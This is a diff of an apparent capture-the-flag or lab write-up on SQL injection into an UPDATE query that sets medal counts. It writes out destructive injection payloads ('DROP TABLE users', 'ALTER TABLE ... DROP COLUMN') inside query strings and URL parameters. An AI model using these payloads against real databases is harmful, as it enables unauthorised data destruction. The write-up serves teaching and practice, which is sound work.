@@ -158,8 +158,7 @@ UPDATE table SET gold = 22, silver = 22, bronze = 22;--, silver = x, bronze = x 
 **ATTEMPT 2**
 
 ```sql
-1; DROP TABLE users;-- 
-1; ALTER TABLE users DROP COLUMN username;--
+1 WHERE 1=1; DROP TABLE users;-- 
 ```
 
 {% code overflow="wrap" %}
@@ -168,15 +167,6 @@ UPDATE table SET gold = 1 WHERE 1=1; DROP TABLE users;-- , bronze = x WHERE id =
 
 ```
 {% endcode %}
-
-
-
-**rank=1\&country=\&gold=22 WHERE 1=1; DROP TABLE users;--\&silver=1\&bronze=1**
-
-```
--> UPDATE table SET gold = 22 WHERE 1=1; DROP TABLE users;--, silver = 22, bronze = x WHERE id = x; 
-rank=1&country=&gold=222 WHERE 1=1; DROP TABLE users;--&silver=22&bronze=22 -> 
-```
 
 **Further learning**
 
